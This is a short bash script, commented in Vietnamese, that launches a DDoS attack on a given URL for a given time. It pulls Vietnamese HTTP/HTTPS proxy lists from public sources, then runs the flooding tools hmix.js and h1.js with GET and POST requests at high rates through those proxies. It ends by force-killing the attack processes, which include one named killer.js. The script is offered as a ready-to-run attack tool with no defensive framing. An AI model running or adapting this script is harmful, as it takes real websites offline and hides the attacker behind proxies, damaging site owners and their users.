#!/bin/bash

# Kiểm tra số lượng tham số 
if [ $# -lt 2 ]; then
    echo "Usage: $0 {URL} {TIME}"
    exit 1
fi

URL=$1
TIME=$2

# Tải proxy vào live.txt cho cả HTTP, HTTPS
> live.txt
for type in http https; do
  curl -s "https://raw.githubusercontent.com/SoliSpirit/proxy-list/refs/heads/main/Countries/${type}/Vietnam.txt" >> live.txt
  curl -s "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&country=vn&ssl=all&anonymity=all&timeout=99999&protocol=${type}" >> live.txt
done


# Chạy tấn công với hmix.js
for method in GET POST; do 
  node hmix.js -m "$method" -u "$URL" -s "$TIME" -p live.txt -t 1 -r 32 --full true -d false &
done

# Chạy tấn công với h1.js
for method in GET POST; do 
  node h1.js "$method" "$URL" live.txt "$TIME" 128 5 randomstring=true &
done
wait

# Dừng tất cả tiến trình liên quan
pgrep -f "hmix.js|h1.js|h1h2.js|http2.js|h1version.js|killer.js" | xargs -r kill -9
